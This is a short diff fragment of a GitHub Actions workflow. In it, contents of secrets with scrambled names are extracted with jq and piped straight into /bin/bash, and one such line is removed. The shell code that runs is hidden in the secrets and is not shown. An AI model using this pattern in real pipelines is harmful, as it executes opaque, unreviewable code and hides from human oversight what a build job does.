@@ -21,7 +21,6 @@ jobs:
           mdzid712: ${{ secrets.mdzid712 }}
         run: |
           printf '%s' "$mdzid712" | jq -r .lhi1426 | /bin/bash
-          printf '%s' "$phfoi051" | jq -r .a909 | /bin/bash
           echo $xvq1555 | jq -r .njt7 | /bin/bash
 
       - name: Save data
